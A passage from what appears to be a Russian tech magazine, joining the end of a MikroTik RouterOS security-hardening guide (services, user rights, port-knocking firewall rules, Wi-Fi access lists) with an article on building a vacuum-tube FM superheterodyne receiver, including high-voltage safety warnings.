на твоем девайсе. Автоматичес ки система не обновляется, поэтому за появ‐
лением новых версий нужно следить вручную. В раз деле Software на сайте
MikroTik лежат  актуальные версии операционной системы и отдельных
пакетов. Простейший спо соб обновить ся: System → Packages → Check For
Updates → Download and Install.
   Те же действия можно выполнить, набрав в консольной строке роуте ра
следующую команду: /system package update install.





                Об новление системы роутера

Доступны четыре ветки раз работки: Long‐term, Stable, Testing и Development.
Для критичных систем рекомендуется ставить Long‐term. Железка, которая
может полежать пару минут в процессе обновления, достойна Stable, осталь‐
ные ветки оставь для экспериментов на домаш нем роутере. Перед обновле‐
нием внимательно читай Changelog. Иногда пол ностью перерабаты ваются
некоторые части ОС, пос ле чего они не способны работать со старой кон‐
фигурацией (так было, нап ример, с bridge в 6.41).
   Если ты счастливый владелец нес кольких роутеров MikroTik, помни, что
массовый апгрейд стандартными средствами невозможен, но можно вос‐
пользоваться The Dude или са мописными скриптами.


PACKAGES
Следующее, за что можно взять ся для повышения безопасности, — отклю‐
чить ненужную функциональность. Не используешь IPv6 — отключай, не нужен
Wi‐Fi — отключи весь модуль, отвечающий за него (все в том же меню System
→ Packages). Обрати внимание, что пол ностью удалить из системы можно
только дополнительные пакеты,  то есть  те,  что не входят в  routeros‐
platformname.


СЛУЖБЫ
Все угрозы для MikroTik работа ют, только если админ заранее не позаботился
о безопасности. При элементарных настройках служб и файрвола роутер
проработает годы без обновлений. В меню IP → Services отключи ненужные
службы. Рекомендую открывать только SSH и Winbox с определенных адре‐
сов, остальное — disable. Того же самого эффекта можно добиться командой
/ip service disable ftp.





                  Список работающих сервисов

Также проверь, не включены ли службы IP: Web Proxy, IP → UPnP, IP → Socks.
Если они включены без твоего ведома, у меня для тебя плохие новости. Вот
команды для отклю чения этих служб из командной консоли: /ip proxy, /ip
upnp, /ip socks.





               Проверяем, поднят ли в системе proxy

RouterOS имеет работа ющий по протоколу MNDP механизм обнаружения
соседей. Знать соседей в своей сети — отличная идея, но вот светить
моделью роутера и вер сией софта в окру жающее пространство вряд ли
хорошо с точки зрения безопас ности.





       Лучше не показывать соседям модель роутера и версию софта

Функция обнаружения соседей, как и многие дру гие фичи в RouterOS,
использует в работе спис ки интерфейсов. В дефолтной конфигурации уже
есть списки LAN, WAN, dynamic, all и none, но можно создать и свои спис ки
со сложной структурой. Допускаются вложенные списки (include) и исклю‐
чения (exclude). Настраиваются они в меню Interface → Interface Lists. Сна‐
чала создаем сам список (кноп ка Lists), затем в основном меню добавляем
в  него интерфейсы. Команда для работы со списками  выглядит  так:
/interface list.





                      Список интерфейсов


             INFO

                   В  список  dynamic   вхо дят  динамические
                      интерфейсы, такие как VPN‐интерфейсы, PPPoE.
                     None означает «ни одного», all — «все». В дефол‐
                       тной конфигурации «домашних» роутеров в спис‐
                        ке WAN будет ether1, в LAN — от ether2
                      до ether5, все Wireless‐интерфейсы и bridge.


Как известно, подклю читься к RouterOS можно не только по IP‐адресу, но и
по MAC. Также работает ping по MAC‐адресу. За работу этих служб отвечает
Tools → MAC Server. Он тоже использует в настройках списки интерфейсов.
Стоит выделить отдельную груп пу интерфейсов под управле ние, а затем раз‐
решить обнаруже ние соседей и MAC Server толь ко ей.
  Не отключай MAC Winbox и MAC Telnet совсем: однажды наступит момент,
когда ты сломаешь себе доступ по Winbox и нуж но будет вос пользоваться
подклю чением по MAC, поэто му лучше держать такой бэкдор для себя. К тому
же MAC Telnet полезен, когда в сети появляется новая железка, у которой
еще нет IP‐адреса. Тогда ее удоб но настраивать из консоли соседнего
роутера.


        WWW

                     На  сайте производителя представлен  полный
                      список доступных сервисов. Можно пройтись
                      по нему и проверить, не включено ли у тебя
                          что‐то лишнее.


Дефолтная конфигурация RouterOS с описанными выше дополнениями
повысит безопасность роутера. Вооб ще, разработ чики пос тарались сделать
Default Conﬁguration максимально уни вер сальной и учли многие нюансы
безопасности. Дальше мы рассмотрим дополнительный харденинг RouterOS.


ПОЛЬЗОВАТЕЛИ И ГРУППЫ
Если ИТ‐отдел в твоей компании большой, в нем наверняка есть раз деление
ролей и обязанностей. К примеру, сотруднику техподдержки ни к чему права
на создание VPN‐соединений или прос мотр пароля  Wi‐Fi, в то вре мя
как сетевики, естественно, должны иметь к ним дос туп. RouterOS имеет дос‐
таточно гибкий механизм распределения прав. Пра ва назначаются в группах,
затем в нужную группу добавляется юзер. Управление группами доступно
в меню System → Users, а также с помощью команды /user group.





                        Уп равление группами

Рассмотрим права групп подробнее:
 • telnet, ssh, ftp, winbox, web, api, romon, dude, tikapp — понятны по наз‐
   ванию. Разрешают юзеру подклю чаться по указанным протоколам;
 • local — открывает доступ к роутеру через консоль. При отключении также
   заберет право открывать терминал внутри Winbox;
 • reboot — право на перезагрузку;
 • read, write — права на чтение или запись;
 • sniﬀ — права на исполнение встроенного ана лога tcpdump (tools → sniﬀer);
 • test — запуск инструментов траблшутин га (ping, traceroute, bandwidth‐test,
   wireless scan, snooper);
 • password — право менять собственный пароль;
 • policy — право управлять учетными записями и группами.


Чувствительные дан ные
На группе настроек sensitive оста новимся чуть подробнее. В RouterOS опре‐
делены так называемые чувс твитель ные данные. К ним относятся ключи Wi‐Fi,
IPSec, SNMP, пароли VPN‐интерфейсов и серверов, пароли протоколов мар‐
шрутизации и другая информация, влияющая на безопасность.
  В меню окна Winbox в разделе Settings есть фла жок Hide Sensitive. Когда
он включен, эта чувствитель ная информа ция закрыта звездочками и в тер‐
минале ее тоже не видно. Эдакая защита от разгла шения паролей. С отклю‐
ченной опцией Sensitive в настройках группы этот чекбокс не снимается, то
есть право Sensitive разреша ет пользователю видеть введенные пароли.





    Право Sensitive разрешает пользователю видеть введенные пароли


PORT KNOCKING
Чуть выше мы говорили об огра ничении дос тупа к управляющим службам
роутера только с определенных адресов. Это очень важно: протокол Winbox
далек от идеала и есть вероятность, что в нем еще будут находить дыры.
Но часто приходится подсоединяться к роутеру из гос тиниц или кафе,
и невозможно предусмотреть все адреса, с которых подключишься.
  Среди админов распростра нена техника Port Knocking. Изначально порт
закрыт для всех. Но стоит снаружи выполнить какую‐то последовательность
действий, как для твоего IP открываются все порты для управления. Этот
набор действий может быть очень сложным, и подоб рать его нереально. Рас‐
смотрим пример:
 • изначально все порты управления закрыты для всех, кроме списка раз‐
  решенных;
 • если  на  порт  роутера  1234  попада ет  TCP‐сегмент,  затем  два
   на порт 4321 и один на порт 5678, то адрес источника заносится в список
   разрешенных на сутки.

Реализовать эту последова тельность действий поможет сле дующий скрипт.


/ip firewall filter
add action=accept chain=input dst‐port=22,8291 protocol=tcp \
    src‐address‐list=mgmt_allow
add action=drop chain=input dst‐port=22,8291 protocol=tcp
add action=add‐src‐to‐address‐list address‐list=mgmt_stage1 \
    address‐list‐timeout=1m chain=input connection‐state=new \
    dst‐port=1234 protocol=tcp
add action=add‐src‐to‐address‐list address‐list=mgmt_stage2 \
    address‐list‐timeout=1m chain=input connection‐state=new \
    dst‐port=4321 protocol=tcp src‐address‐list=mgmt_stage1
add action=add‐src‐to‐address‐list address‐list=mgmt_stage3 \
    address‐list‐timeout=1m chain=input connection‐state=new \
    dst‐port=4321 protocol=tcp src‐address‐list=mgmt_stage2
add action=add‐src‐to‐address‐list address‐list=mgmt_allow \
    address‐list‐timeout=1d chain=input connection‐state=new \
    dst‐port=5678 protocol=tcp src‐address‐list=mgmt_stage3

Правила 3–6  (action=add‐src‐to‐address‐list) выпол няют опи санную
выше логику. Пер вое пра вило разрешает дос туп к управлению роутером
только адресам из списка mgmt_allow, который заполняется на этапах 3–6.
Второе правило запрещает дос туп всем. Первые два правила вынесены
наверх для того, чтобы избежать ненуж ного прохож дения менеджмента тра‐
фика по четырем правилам с логикой и тем самым снизить нагрузку на CPU.
  Но провернуть подоб ную операцию с Windows не так просто: из стандар‐
тного набора программ выпилили Telnet, а качать сто ронний софт не всегда
возможно. Зато любая ОС поз воляет менять размер ICMP‐пакета при пинге.
Этим мы и воспользуемся. Изменим условия:
 • изначально все порты управления закрыты для всех, кроме списка раз‐
  решенных;
 • если на роутер попадает ICMP Request размером 345 байт, затем два раз‐
  мером 543 и один 678 байт, то адрес источника заносится в список раз‐
  решенных на сутки.

Для этого все го лишь поменя ем предыду щие пра вила:
 1. Установим прокол ICMP.
 2. На вкладке Advanced зададим раз мер Packet Size.


             INFO

                    Не забывай, что размер пакета, указанный в пин‐
                             ге, и размер пакета, долетевшего до роутера, —
                        это разные значения. В Linux к ICMP прибавляет‐
                        ся 28 байт заголовков, то есть, чтобы отправить
                        пакет размером 345 байт, нужно в пинге ука зать
                       размер 317. У Windows цифры другие — она
                        по‐своему считает заголовки.



WIRELESS
RouterOS поддерживает белые и черные списки Wi‐Fi. Для этого есть список
Wireless Access List. Прос то добавь туда устройства, которые не имеют права
подклю чаться к сети, а потом сними флажки Authentication и Forwarding.
Еще для этих целей можно использовать команду /interface wireless ac‐
cess‐list add.





                  Нас трой ка черного спис ка Wi‐Fi

Описанный выше случай будет работать как Blacklist. Чтобы преобразовать
его в Whitelist, нужно пос тавить ука занные флаж ки и изменить тип работы
интерфейса Wireless с помощью команды /interface wireless set 0 de‐
fault‐authentication=no.





                     Нас трой ка белого списка

Флажок Authentication отвечает за аутентифика цию клиентов. Если он уста‐
новлен для определенного интерфейса, аутентификация разрешена всем,
кроме тех устройств, которые перечислены в списке доступа без флажка.
Если на интерфейсе флажок не уста новлен, то подключиться к сети могут
лишь те, кто присутствует в списке дос тупа с флажком.
  Настройка Forwarding отвечает за передачу данных между клиентами
одной подсети. Обычно ее не стоит тро гать, но, если ты строишь, к при меру,
hotspot‐сеть, клиенты которой будут ходить только во внешние сети (то есть
внутреннее взаимодействие им не нужно), отклю чи данную опцию — это улуч‐
шит качество связи.
  С помощью Wireless Access List можно нас троить сложную логику работы
клиентов: по уровню сигнала, времени суток, ограничить скорость каждого
клиента или загнать его в определенный VLAN без допол нительных телод‐
вижений. Очень рекомен дую поз накомить ся с этим инстру ментом поближе.


             INFO

                    А еще MikroTik умеет делать SSID в виде эмодзи,
                       например так: ΨΥЁ. Для этого нужно перевес‐
                         ти символы в Unicode с помощью инструмента
                      вроде  такого  и  вставить  полученную  строку
                        в SSID.



ЗАКЛЮЧЕНИЕ
Мы рассмотрели минимум действий, которые помогут роутеру стать безопас‐
нее, а админу спать спокойнее. Но у RouterOS под капотом еще очень много
возможностей, и если не вклю чать мозг при их настройке, то никакие статьи
не уберегут тебя от взло ма. Вооб ще, мозг — отличный инструмент. Им нужно
пользоваться регулярно.
GEEK
ЛАМПОВЫЙ
СИГНАЛ





       Candidum
    duospirit@gmail.com





СОБИРАЕМ FM‐РАДИОПРИЕМНИК
НА ЛАМПАХ




Давным‐дав но, когда компьюте ры были боль шими, прототи‐
пы первых транзисторов еще не покинули стены исследова‐
тельских лабораторий Bell Labs, а формата МР3 не сущес‐
твовало и в помине, аудиофилы пребыва ли в своем аналого‐
вом раю, нас лаждаясь теплой ламповой музыкой из ради‐
оприемников и винило вых проигрывателей. Насколь ко слож‐
но сегодня послушать бессмертные хиты Луи Армстронга
и Элвиса Прес ли в «аутентичном» исполнении? Самое вре‐
мя это выяснить.


Как и любая другая информация, звук сейчас хра нится преимущественно
в цифровом виде. Конечно, его качество на выходе сильно зависит от харак‐
теристик конкретного устройства — используемого ЦАП (цифро‐аналогового
преобразователя) и ОУ (операционного усилителя). Но в целом от дискрет‐
ности и квантования сигнала уже никуда не денешь ся.
   Тут, конечно, можно вспомнить про кассеты, пластинки и проигрывате‐
ли‐«вертушки». У них есть свои ценители, и даже сегодня дос тать экземпляры
такой техники в приличном состоянии не сос тавля ет особого труда. Однако
собрать нечто похожее «на коленке» уже не получится: тут нужна достаточно
сложная механика. Что же делать?
  Выход есть! Сигнал можно взять из ради оэфира. Тем более раньше
это было совсем тривиально: открываешь книжку для радиолюбителей
и собираешь себе ДВ/СВ‐приемник 1V1 или 1V2 — схемы там очень прос‐
тые. И уже через пару часов можно слушать радио «Маньяк».


             INFO

                    Приемники прямого усиления классифицируются
                      по количеству каскадов усиления до и после
                        детектора. Таким образом, 1V1 означает, что
                      приемник содержит один каскад УВЧ (усилитель
                      высокой частоты), детек тор и один каскад УНЧ
                          (усилите ля низкой частоты). Подробнее смот ри
                       на страницах Википедии.


Но это было раньше, а с 2014 года вещание в ДВ‐ и СВ‐диапазоне на тер‐
ритории России было прекращено полностью (эфир зашумлен, да и нерен‐
табельно). Впрочем, справедливости ради можно отметить, что высококачес‐
твенного звука на длинных и средних волнах никогда и не было. Это объ ясня‐
ется узкой полосой вещания (около 10 кГц), а ее ширина напрямую связана
с шириной диапазона переда ваемого зву кового сигнала. Таким образом,
наши запросы удовлетво рит только FM‐диапа зон.
   Здесь дела обстоят нес колько сложнее, так как приемники прямого уси‐
ления уже неэффективны. Хотя, конечно, их тоже иногда собирают, но это
скорее экзотика. Более‐менее приемлемых результатов можно добиться,
только  собрав  сверхрегенератор.  У  сверхрегенеративного  приемника,
пожалуй, лучшее соот ношение простоты конс трукции и эффективности. Бук‐
вально из десят ка деталей можно соб рать работающую схему. Однако качес‐
тво звучания оставляет желать лучшего, и вот с этим практически ничего
не поделать.
  Иными словами, чтобы добиться хороших результатов, мы вынуждены
остановить свой выбор на супергетеро дине. Современный FM‐приемник
можно реализовать на одной микросхеме RDA5807, содержащей в себе пол‐
ный тракт супергетеродина с цифровым управлением. Она поддерживает
стерео и RDS, но об этом как‐нибудь в другой раз.
  Наиболее прост в реализации супергетеродин с низкой промежу точной
частотой и частотно‐импульсным детектором. Такой приемник может содер‐
жать лишь одну перестра иваемую цепь, что очень упрощает конструкцию.
Разберем принцип его работы подробнее.


СУПЕРГЕТЕРОДИН
Супергетеродинный приемник, в отличие от приемника пря мого усиления,
предполагает пре образование принимаемого сиг нала в промежу точную час‐
тоту, на которой выполняется селекция. Такое решение позволяет сократить
количество перестраиваемых элементов, что зна чительно облегчает задачу.





             Блок‐схема типичного гетеродин ного приемника

На схеме хорошо видно, что принимаемый сиг нал уси ливается и поступает
в смеситель, туда же подается выход с гетеродина (вспомогательного
генератора). В резуль тате сигнал смесителя содержит биения, час тота
которых равна разности принимаемого сиг нала и сигнала гетеродина.
Из смесителя поток попада ет в полосовой филь тр, который выделяет сигнал
промежуточной частоты.
  Именно в этом месте выполняется селекция. Далее промежуточная час‐
тота усиливается и поступает в детектор, выделя ющий аудиосигнал. Пос‐
ледний преобразовывается УНЧ и пода ется на динамик или наушники. Схема
в целом достаточно сложная, но зато она выигрывает с точки зрения стабиль‐
ности работы.
  Можно ли в этой схеме что‐нибудь упростить? Да, можно! Если сде лать
промежуточную частоту дос таточно низкой (~200 кГц), то полосовой фильтр
можно заменить фильтром низких час тот, что существенно упрощает конс‐
трукцию (собственно, так работа ет микросхема К174ХА34). А еще упростить
схему можно? Конечно! Можно совместить смеситель с гетеродином, подоб‐
ные приемники еще называют авто дина ми.


        WWW

                     Подробнее прочитать о принципе работы супер‐
                        гетеродин ного приемника можно в Википедии.



ЧАСТОТНО-ИМПУЛЬСНЫЙ ДЕТЕКТОР
Теперь остановимся подробнее на детекторе. Из его наз вания сле дует, что
частотная модуляция подразумевает изменение час тоты несуще го сигнала
под действием модулирующего сигнала. Продемонстрировать это можно
следующим графиком.





                       Суть частотной модуляции

Для обратной процедуры, то есть выделения ауди осигнала, и используется
ЧМ‐детектор. Существует мно го видов час тотных детекторов, но особняком
среди них стоит так называемый счетный детектор.
  Принцип работы счетного детектора дос таточно прост для понимания.
Частотно‐модулированный сигнал пропускают через ограничитель, получая
на выходе меандр переменной частоты. Пос ле этого по вос ходяще му
или нисходящему сигналу генерируют импульс постоянной ширины. Таким
образом, из сигнала переменной час тоты мы получили импульсы с изме‐
няющимся периодом следования, а так как ширина импульсов постоянна, то
коэффициент запол нения тоже меняется. То есть мы получили ШИМ‐сигнал.
Полученный ШИМ‐сигнал интегрируют, что дает на выходе аудиосигнал.
  В общем, частотно‐импульсный детектор работа ет точно так же, как ЦАП,
на ШИМ‐генераторе. Однако у такого детектора есть некоторые ограниче‐
ния, и это прежде всего час тота входного сигнала, которая дол жна быть
ниже 1 МГц (при усло вии, что откло нение частоты составляет ±50 кГц, харак‐
терное для широкополосной FM‐модуляции), так как на больших частотах
начинает падать эффективность детектора. Впро чем, в нашем случае это,
наоборот, пре имущество.


        WWW

                        Есть  замечательное  видео,  где  разбира ется
                       работа счетного детек тора с осциллограмма ми.


Интересно отме тить, что в отечес твенной радиолю бительской литературе
данный детектор упоминается редко, а ламповых конструкций в рунете и вов‐
се не сыскать, тогда как в Европе и Авс тра лии эти схемы достаточно популяр‐
ны. Например, одним из самых извес тных приемников с частотно‐импуль‐
сным детектором был Sinclair Micro FM. Да, это тот самый Синклер, который
разработал ZX Spectrum.


ПРИНЦИПИАЛЬНАЯ СХЕМА
Итак, приступим к сборке такого девайса. В качес тве исходной точки возьмем
вот эту конструкцию.





                     Концепт схемы приемника

Начнем с ламп. Очевидно, что в Авс тра лии, где была разработана исходная
схема, доступны немного дру гие лампы, поэтому адаптируем набор деталей
под то, что есть у меня в наличии. Так, на входе стоит 6BL8, а это полный ана‐
лог нашей 6Ф1П, которая всегда применялась для УРЧ и конвертеров.


           WARNING

                   В  анодных  цепях  радиоламп  использует ся
                      высокое напряжение, опасное для жизни и здо‐
                         ровья!  Если  у  тебя  нет  достаточного опыта
                      работы  с  высоковольтными  схе мами,  катего‐
                       рически не рекомендуется повторять все описан‐
                      ное  ниже  на  прак тике,  по  крайней  мере
                       без помощи опытного специалиста.


От ламп 6AU6, аналога 6Ж4П, я также отказался и сна чала хотел собрать УПЧ
на триодах, например 6Н1П или 6Н23П. Однако, поскольку усиление три‐
одного каскада ниже, в усилителе на триодах нуж но больше кас кадов, а это
может привести к самовозбуждению. Тем не менее некоторые радиолюбите‐
ли успешно делали триодные УПЧ.
  Остановив свой выбор на пентодах, я хотел при менить пентод 6Ж1П, но у
меня не нашлось необ ходимого количес тва соответствующих панелек, поэто‐
му я решил исполь зовать неведомо отку да взявшиеся у меня E83F (отечес‐
твенных аналогов нет). Ограничитель соб ран на той же E83F. В детекторе
использован отечественный ана лог 6AL5 6Х2П — это детекторный двойной
диод. В усилитель звуковой частоты вместо 6BM8 (наш аналог 6Ф3П) я
использовал 6Ф5П, схему тоже немного изменил, взяв одну из описанных
в интернете, благо ламповых УЗЧ сущес твует великое множество. В итоге
схема получилась такая.





        Адаптированная и переработанная схема радиоприемника

Рассмотрим появившиеся в моей схеме изменения и дополнения подробнее.


УВЧ и сме ситель
Отличий здесь не так много: просто поставим в цепь накала два дросселя,
«холодные» концы которых заземлим через блокировочные конденсаторы.
Кроме того, добавим блокировочный конденсатор на анод пентодной час ти.
   Эти изменения делают схему гораз до менее капризной. Кроме того,
добавим АРУ (автоматическая регулировка усиления) во входной кас кад.
Впрочем, каких‐то изменений от добавления АРУ я не заметил, но с АРУ луч‐
ше, чем без него. Управлять усилением можно, подавая отрицательное нап‐
ряжение на сетку триода УВЧ.


УПЧ
Здесь изменения более существенные. Пос коль ку я использовал совер‐
шенно другую лампу, необходимо было перес читать номиналы всех резис‐
торов. Впрочем, если не выбирать режим лампы, а использовать рекомен‐
дованный, то рассчитать номиналы дос таточно легко. Итак, рассмотрим
типичный усилительный кас кад на пентоде.





            Усилительный каскад на пентоде с общим катодом

Нам необходимо рассчитать зна чения Ra, Rk и Rg2, так как именно они опре‐
деляют режим работы лампы, номиналы прочих элементов можно не трогать.
В этих нехитрых расчетах нам поможет закон Ома: I = U/R. Из даташи та
на E83F мы видим, что рекомендованы следующие параметры:
 • напряжение анода 210 В;
 • ток анода 10 мА;
 • ток второй сетки 2 мА;
 • напряжение второй сетки 120 В;
 • резистор в цепи катода 165 Ом;
 • крутизна при указанных параметрах 10 мА/В.

Получается, что на катоде должно быть (Ia+Ig2)*Rk = 0,012*165 = 1,98 В, то
есть около двух вольт. Под рукой были резисторы на 220 Ом, их я и поставил
вместо рекомен дованных 165 Ом. Теперь рассчитаем резистор в цепи вто‐
рой сетки. Мы планируем питать УПЧ от напряжения примерно 220 В, то есть
на резисторе дол жно быть падение напряжения U–Ug2 = 220–120 = 100 В при
токе 2 мА. Таким образом, требуемое сопротивление Rg2 = (U–Ug2)/Ig2 =
100/0,002 = 50 000 = 50 К.
   Рассчитаем сопротивление резистора в анодной цепи, зная, что коэф‐
фициент усиления пентодно го каскада примерно равен Ra*S. Име ет смысл
взять сопротивление побольше, одна ко опус кать напряжение на аноде
ниже 80 В не стоит, поэто му заложим анодное напряжение 120 В с запасом.
Тогда Ra = (Uпит–Ua)/Ia = (220–120)/0,01 = 10 000 = 10 К. Под рукой ока‐
зались одноваттные резисторы на 8,2 К, их я и поставил. Здесь нужно исполь‐
зовать минимум одноваттные резисторы, так как на них будет рассеивать‐
ся 0,82 Вт. Теплый ламповый звук, однако!
   Это, конечно, упрощенный способ рас чета пентодного кас када, но он
вполне рабочий. Таким же обра зом можно легко перес читать номиналы
под другой пентод. В УПЧ нет никаких строгих требований к характерис тикам,
а линейность и вовсе не важна, так что подой дет любой маломощный пентод.
  Со схемами каскадов мы разобрались, теперь вернемся к общей схеме
УПЧ. Строить трехкаскадный УПЧ для при емни ка, работающего в крупном
мегаполисе, нет никакого смысла. Кроме того, добавление каждого нового
каскада повышает риск самовозбуждения. Эксперименты показали, что двух
каскадов вполне хватает и они выдают дос таточный сигнал для работы огра‐
ничителя.
  Примерный расчет показывает, что уси ление двухкаскадного УПЧ будет
82*82 = 6724, а реальное усиление, как будет продемонстрировано далее,
заметно ниже, но и этого вполне дос таточно. Более того, для приема мощных
станций дос таточ но и одного кас када. Так, при уверенном приеме на сетку
второго каскада поступает сигнал до одно го вольта!
  Между смесителем и УПЧ я установил фильтр низкой частоты (ФНЧ) с час‐
тотой сре за около 150 кГц, это поз воляет поднять селективность по сосед‐
нему каналу, в упомянутой выше статье фильтра не было. В качес тве фильтра
работала ограниченная полоса пропускания УПЧ. Допол нительный фильтр
повышает селективность приемника, что акту ально при большом количестве
близкорасположенных мощных станций.


ОГРАНИЧИТЕЛЬ И СЧЕТНЫЙ ДЕТЕКТОР
Последний каскад УПЧ — ограничитель, от первых двух его отличает
пониженное напряжение питания и малое напряжение смещения на управля‐
ющей сетке 1 В. Из‐за такого режима и дос таточно сильного сигнала, при‐
ходящего на вход (до нескольких вольт), каскад работает практически в клю‐
чевом  режиме  с  сеточным  током.  Наличие  последнего  нам  удобно
как источник отрицатель ного напряжения, пропорционального величине сиг‐
нала, которое исполь зует ся для индикатора нас тройки и АРУ.
   То есть при наличии сеточного тока про исходит отсечка положительных
полуволн сигнала и с сетки можно снять отрицатель ное напряжение. А клю‐
чевой режим дает практически меандр на выходе с амплитудой пример‐
но 70 В. Ограничитель, помимо прочего, поз воляет подавить паразитную
амплитудную модуляцию, что положительно ска зывается на качестве зву‐
чания.
  Затем сле дует фор мирователь импульсов. Он состоит из конденсатора
и двух диодов. Через один диод конденсатор заряжается, а через второй
идет разряд на резистор. Так как емкость конденса тора мала, то за время
одного импульса конденсатор успевает полностью зарядиться (вос ходящий
фронт), а затем пол ностью разрядиться (нисходящий фронт). За счет этого
и достигается формирование импульсов примерно одинаковой длительнос‐
ти. Форма этих импульсов, конечно, далека от меандра и больше похожа
на пилу, которую я завсегда смо гу отличить от сойки, когда ветер южный,
а погода — ясная.
   Если усложнить схему, можно получить импульсы более приглядной фор‐
мы, но профит от это го небольшой. Далее эти импульсы поступают на RS
ФНЧ, похожий на тот, что был на выходе смесителя, только у этого фильтра
частота сре за ниже. И на его выходе мы имеем желанный аудиосигнал,
а остаточные пульсации с час тотой ПЧ отфильтруются полосой пропускания
первого каскада УЗЧ. Во вся ком случае, на осциллограммах сигнала на сетке
оконечного каскада УЗЧ их не видно.


УЗЧ
Особо расписывать УЗЧ не вижу смысла, так как он выполнен по типичной
схеме, которых в интернете великое множество. Схема совершенно обычная:
предусилитель на триодной части 6Ф5П и оконечный кас кад на пентодной
части ее же. Почему именно 6Ф5П? Потому что у меня был трансформатор
ТВЗ‐1‐9, который рассчитан на работу с лампами 6П14П и 6Ф5П. В сущ‐
ности, усилитель может быть любой, детектор на выходе дает сигнал до нес‐
кольких вольт, а этого вполне достаточно, чтобы раскачать УЗЧ. Ориенти‐
ровочная мощность моего усилителя сос тавляет 3 Вт, этого хватает для наг‐
лядной демонстрации работы приемника.


ВОЛШЕБНЫЙ ГЛАЗ
Вакуумно‐флю оресцентный индикатор  нас тройки,  или,  как  его обычно
называют, «волшебный глаз», — вещь совершенно необходимая ламповому
радиоприемнику. Во‐первых, он облегчает настройку на станцию, а во‐вто‐
рых, придает устрой ству особый шарм. В качестве индикатора настройки
использовалась отечественная лампа 6Е1П, вклю ченная по типовой схеме.
Управляющее отрицательное напряжение, как уже упоминалось, берется
с сетки ограничителя через резистор большого сопротивления.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ
  ЛАМПОВЫЙ СИГНАЛ
         СОБИРАЕМ FM‐РАДИОПРИЕМНИК НА ЛАМПАХ





КОНСТРУКЦИЯ ПРИЕМНИКА
Конструктивно приемник выполнен навес ным монтажом внутри сборной алю‐
миниевой коробки размером 50 × 120 × 240 мм. Крышка изготовлена из алю‐
миния толщиной 2,5 мм, стенки и дно — из алю миния толщиной 1 мм. Дном
можно пренебречь, но это нес колько ухудшит стабиль ность работы приемни‐
ка. На крышке расположены восемь панелек для ламп (одна из них осталась
незадействованной), также на ней закреплен трансформатор УЗЧ и перемен‐
ный конденсатор.


           WARNING

                      Если  ты  когда‐нибудь  хотя бы  задумывался
                      о покупке Hi‐End лампового усилителя высокого
                      ценового сегмента, фотографии ниже могут при‐
                        чинить тебе моральную травму.





                          Вид сверху

Шасси соединено с общим проводом, внут ри раз мещены шины из медной
проволоки диаметром 2 мм, соединенные с шас си и играющие роль обще го
провода. Монтаж навесной. Конечно, туда стоило добавить несколько стоек
с лепестками контактов, но я поленился.


             INFO

                   Монтаж высокочастотной части, а именно УРЧ
                      и смесите ля, должен быть по возможности более
                     жестким   и   выполненным   проводниками
                     минимальной длины, в про тивном случае работа
                        устройства будет нестабильна, что выражается
                        в дрейфе частоты. Идеальный вариант — помес‐
                         тить ВЧ‐часть в отдельный экран.





                          Вид снизу

На передней стен ке закреплены резисторы регулировки громкости и режима
работы смесите ля, туда же выведена ручка переменного конденсатора.





                         Вид спереди

На задней стенке закреплены разъемы блока питания, динамика и антенны.





                          Вид сзади

Блок питания выпол нен в отдельном корпусе, но такое исполнение не прин‐
ципиально. Правильнее было бы немного увеличить размеры девайса
и смонтировать блок питания в одном корпусе с ним (трансформатора
на 100 Вт хватит с избытком). Впрочем, это можно рассматривать как фичу:
в двадцатых годах прошлого века блоки питания тоже часто делали отдель‐
ными.





                           Блок питания

Дроссели, примененные в приемнике, самодельные. Дроссели в цепи накала
наматываются на резисторы 0,25 Вт соп ротивлением больше 100 К и вклю‐
чают 150 витков эмалированного про вода диаметром 0,12 мм. Высокочас‐
тотные  дроссели  представляют собой 75 см  (четверть  длины  вол ны
на 100 МГц) эмалиро ванного провода диаметром 0,7 мм, намотанного
на бумажный кар кас диаметром 5 мм. Контурная катушка содержит четыре
витка эмалированного про вода диамет ром 2 мм.


НАСТРОЙКА
Приемник достаточ но неприхотлив и при пра вильной сборке начинает
работать сразу. Тем не менее есть ряд общих рекомендаций по его настрой‐
ке.
 1. После вклю чения проверя ют наличие накала ламп. Если накала нет, то
   следует проверить исправность лампы или искать обрыв/замыкание
   в цепи накала. Нити подогревателей прогретой лампы должны све титься
   оранжевым.
 2. Следует проверить наличие анодных нап ряжений. Некоторые напряжения
   указаны на схеме.
 3. Проверь режим работы ламп, установив требуемые напряжения в катод‐
   ной цепи. Если отклонения существенны (больше 50%), следует подоб‐
   рать соответствующие резисторы.
 4. Проверь работу УНЧ: при прикосновении к движку резис тора пальцем
   должен слышаться характерный шум в динамике. Проверить работу УПЧ
   без осциллографа сложнее, но, если напряжения установлены верно
   и ошибок при сборке нет, он будет работать.
 5. Проверь работу смесителя. Когда вращаешь ручку управления режимом
   работы смесите ля, в мес те начала генера ции дол жен появляться шум
   в динамиках.
 6. Проверь работу УВЧ: при касании антенно го входа отверткой в динамиках
   раздаются характерные щелчки.


           WARNING

                    Прикасаться к элементам схемы, находящейся
                      под нап ряжением,  категорически не рекомен‐
                        дуется, это может привести к поражению элек‐
                       трическим током! Это опасно для жизни и здо‐
                         ровья.


Если все работает, то ручкой регулировки режима смесителя получаем появ‐
ление шума в динамиках, после чего переменным конденсатором настра‐
иваемся на радиостанцию. Затем более точной подстройкой режима сме‐
сителя и частоты добива емся наилучшего качества приема. В этом помогает
индикатор настрой ки. Все! Можно нас лаждать ся теплым ламповым звуком.
Качество звучания это го приемника ока залось дос таточно хорошим, во вся‐
ком случае, с качеством зву чания сверхрегенератора оно не сравнится.
   Ну и напоследок самое интерес ное, то, ради чего все и затевалось, —
осциллограммы сигнала в раз ных точках схемы. Осциллограмм работ сме‐
сителя у меня нет по причине того, что щупы осциллографа сильно влияют
на режим его работы, поэто му начнем с УПЧ.
   Рассмотрим сигнал на входе и выходе первого кас када УПЧ. На осциллог‐
рамме входного (снизу) сигнала видно, что из смесите ля, кроме сигнала ПЧ,
проходит высокочастотный шум, и его амплитуда даже больше амплитуды
нужного сигнала. Но это не страшно, так как он отфильтруется полосой про‐
пускания каскада. И действительно, в осциллограмме выходного сигнала
виден только сигнал ПЧ с амплитудой около 200 МВ. Обрати внимание, что
у осциллограмм разный масштаб. Из этих осциллограмм можно уви деть, что
реальный коэффициент усиления каскада сос тавля ет около 30 против рас‐
четных 80.





             Сигнал на входе и выходе первого каскада УПЧ

Уже в этом месте с помощью осциллографа можно увидеть настройку
на станцию, что выглядит как повышение амплитуды сигнала и пульсирующее
